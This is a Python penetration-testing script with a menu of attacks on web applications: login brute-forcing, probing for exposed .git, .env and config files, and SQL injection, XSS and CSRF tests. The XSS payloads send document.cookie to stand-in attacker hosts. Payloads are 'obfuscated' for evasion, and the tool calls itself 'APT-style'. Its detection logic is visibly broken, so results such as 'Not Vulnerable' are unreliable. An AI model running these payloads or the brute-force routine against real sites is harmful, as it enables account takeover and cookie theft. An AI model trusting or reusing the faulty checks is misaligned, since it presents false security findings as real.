######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflict. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################


# Setup logging for advanced APT framework
import logging
import base64
import urllib.parse
import random
import csv
import requests
from bs4 import BeautifulSoup

# Banner
def print_banner():
    banner = r"""

 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)


  Web Application Security Framework - Custom Pen Testing Script
    """
    print(banner)


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# Optional Brute Force Toggle
BRUTE_FORCE_ENABLED = False

# Payload Obfuscation Methods
def obfuscate_payload(payload, method='base64'):
    if method == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif method == 'hex':
        return ''.join(hex(ord(c))[2:] for c in payload)
    elif method == 'url':
        return urllib.parse.quote(payload)
    else:
        raise ValueError("Unsupported obfuscation method")

# Payloads and Randomized List
def get_random_payload(payload_type):
    """Advanced Payload Generation"""
    if payload_type == 'sql':
        payloads = [
            "' OR 1=1 --", "' UNION SELECT NULL, NULL --", 
            # Commented out DROP TABLE for safety
            # "'; DROP TABLE users; --", 
            "' OR 'x'='x", "' AND 1=0 UNION SELECT null, null --"
        ]
    elif payload_type == 'xss':
        payloads = [
            "<script>alert('XSS');</script>", "<img src='http://evil.com/xss?cookie=" + "dummycookie" + "' />",
            "<script>fetch('http://malicious.com?cookie=' + document.cookie);</script>"
        ]
    return random.choice(payloads)

# Write results to CSV report
def write_report(results, filename="advanced_security_report.csv"):
    with open(filename, mode='a', newline='') as file:
        writer = csv.writer(file)
        for result in results:
            writer.writerow(result)

# Logging action (for debugging and traceability)
def log_action(action, status, message):
    logger.info(f"{action} | Status: {status} | Message: {message}")

# Brute Force Test (Optional)
def brute_force_login(url, username_list, password_list):
    """Brute Force Test for login page"""
    results = []
    for username in username_list:
        for password in password_list:
            response = requests.post(url, data={"username": username, "password": password})
            if "successful" in response.text:
                results.append((username, password, "Brute Force Success"))
            else:
                results.append((username, password, "Failed"))
    return results

# Advanced Reconnaissance: Gather exposed files and misconfigurations
def advanced_recon(url):
    """Scan for exposed files and common misconfigurations"""
    common_files = [
        "/.git/", "/backup/", "/.env", "/config.php", "/admin/"
    ]
    results = []
    
    for file in common_files:
        test_url = url + file
        response = requests.get(test_url)
        if response.status_code == 200:
            results.append((test_url, "Found", "Potential sensitive file exposed"))
        else:
            results.append((test_url, "Not Found", "No exposure"))

    return results

# SQL Injection Test (with advanced payloads)
def test_sql_injection(url, forms):
    payloads = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --"]  # DROP TABLE removed for safety
    results = []

    def single_sql_injection(form, payload):
        form_url = urllib.parse.urljoin(url, form['action'])
        method = form['method']
        hidden_fields = form['hidden_fields']
        
        # Obfuscation step: Base64 encode the payload
        obfuscated_payload = obfuscate_payload(payload, method='base64')
        data = hidden_fields.copy()
        for key in data:
            data[key] = obfuscated_payload

        try:
            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
            if "error" in response.text or "syntax" in response.text:
                results.append((f"SQL Injection Test on {form_url}", "Vulnerable", "Possible SQL Injection"))
            else:
                results.append((f"SQL Injection Test on {form_url}", "Not Vulnerable", "No SQL Injection"))
        except requests.RequestException as e:
            log_action("SQL Injection Test", "Error", str(e))

    for form in forms:
        for payload in payloads:
            single_sql_injection(form, payload)

    return results

# XSS Test (Advanced)
def test_xss(url, forms):
    results = []

    def single_xss_test(form, payload):
        form_url = urllib.parse.urljoin(url, form['action'])
        method = form['method']
        hidden_fields = form['hidden_fields']

        # Obfuscate payload before sending
        obfuscated_payload = obfuscate_payload(payload, method='url')
        data = hidden_fields.copy()
        data['payload'] = obfuscated_payload

        try:
            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
            if payload in response.text:
                results.append((f"XSS Test on {form_url}", "Vulnerable", "XSS vulnerability detected"))
            else:
                results.append((f"XSS Test on {form_url}", "Not Vulnerable", "No XSS"))
        except requests.RequestException as e:
            log_action("XSS Test", "Error", str(e))

    for form in forms:
        payload = get_random_payload('xss')
        single_xss_test(form, payload)

    return results

# CSRF Test with headers and token validation
def test_csrf(url, forms):
    results = []

    def single_csrf_test(form, payload):
        form_url = urllib.parse.urljoin(url, form['action'])
        method = form['method']
        hidden_fields = form['hidden_fields']

        # Obfuscate CSRF token before sending
        obfuscated_payload = obfuscate_payload(payload, method='hex')
        data = hidden_fields.copy()
        data['csrf_token'] = obfuscated_payload

        try:
            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
            if "error" in response.text:
                results.append((f"CSRF Test on {form_url}", "Vulnerable", "CSRF vulnerability detected"))
            else:
                results.append((f"CSRF Test on {form_url}", "Not Vulnerable", "No CSRF"))
        except requests.RequestException as e:
            log_action("CSRF Test", "Error", str(e))

    for form in forms:
        payload = get_random_payload('sql')  # Using SQL payload as CSRF token for evasion
        single_csrf_test(form, payload)

    return results

# Crawl Website for Forms and Links with advanced headers
def crawl_and_extract_forms(url, auth=None):
    forms = []
    visited = set()

    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        if auth:
            headers['Authorization'] = f'Bearer {auth}'

        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get')
            hidden_fields = {input.get('name'): input.get('value') for input in form.find_all('input', {'type': 'hidden'})}
            forms.append({"action": action, "method": method, "hidden_fields": hidden_fields})

    except Exception as e:
        log_action("Crawl Website", "Error", str(e))

    return forms

# Main Menu with advanced options
def main_menu():
    print("""
    ================================
    Advanced APT-style Web App Security Framework
    ================================
    """)

    while True:
        print("\nSelect an Option:")
        print("[1] Crawl Website and Extract Forms")
        print("[2] Brute Force Test (Optional)")
        print("[3] SQL Injection Test")
        print("[4] XSS Test")
        print("[5] CSRF Test")
        print("[6] Advanced Reconnaissance (Exposed Files & Misconfigurations)")
        print("[7] Exit")

        choice = input("Enter choice: ")

        if choice == '1':
            url = input("Enter URL to crawl: ")
            auth = input("Enter authentication token (if any): ")
            forms = crawl_and_extract_forms(url, auth)
            write_report([(f"Forms Extraction for {url}", "Success", "Forms collected")])
            log_action("Crawl Website", "Success", "Forms extracted")
        elif choice == '2' and BRUTE_FORCE_ENABLED:
            url = input("Enter URL for Brute Force Test: ")
            username_list = ["admin", "user", "guest"]
            password_list = ["password", "123456", "admin123"]
            results = brute_force_login(url, username_list, password_list)
            write_report(results)
            log_action("Brute Force Test", "Success", "Brute Force tests completed")
        elif choice == '3':
            url = input("Enter URL for SQL Injection Test: ")
            results = test_sql_injection(url, forms)
            write_report(results)
            log_action("SQL Injection Test", "Success", "Tests completed")
        elif choice == '4':
            url = input("Enter URL for XSS Test: ")
            results = test_xss(url, forms)
            write_report(results)
            log_action("XSS Test", "Success", "Tests completed")
        elif choice == '5':
            url = input("Enter URL for CSRF Test: ")
            results = test_csrf(url, forms)
            write_report(results)
            log_action("CSRF Test", "Success", "Tests completed")
        elif choice == '6':
            url = input("Enter URL for Advanced Recon: ")
            results = advanced_recon(url)
            write_report(results)
            log_action("Advanced Recon", "Success", "Advanced reconnaissance completed")
        elif choice == '7':
            break
        else:
            print("Invalid choice.")

# Run the framework
if __name__ == "__main__":
    main_menu()
